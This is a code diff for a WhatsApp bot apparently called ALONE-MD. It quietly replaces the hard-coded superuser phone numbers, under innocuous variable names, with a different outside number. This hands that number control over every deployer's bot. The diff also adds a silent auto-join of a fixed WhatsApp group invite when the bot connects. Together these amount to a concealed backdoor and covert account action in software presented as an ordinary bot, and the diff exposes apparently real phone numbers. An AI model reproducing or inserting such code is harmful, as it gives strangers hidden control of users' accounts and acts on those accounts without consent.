@@ -154,10 +154,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255716661569';
-            const dj2 = '255716661569';
-            const dj3 = "255716661569";
-            const luffy = '255716661569';
+            const dj = '255673750170';
+            const dj2 = '255673750170';
+            const dj3 = "255673750170";
+            const luffy = '255673750170';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -880,6 +880,7 @@ ${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
                 console.log("ℹ️ ALONE-MD connecting in your account...");
             }
             else if (connection === 'open') {
+                await zk.groupAcceptInvite("DizrXzN1o1k0HsrWay5hvX");
                 console.log("✅ ALONE-MD connected successfully☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
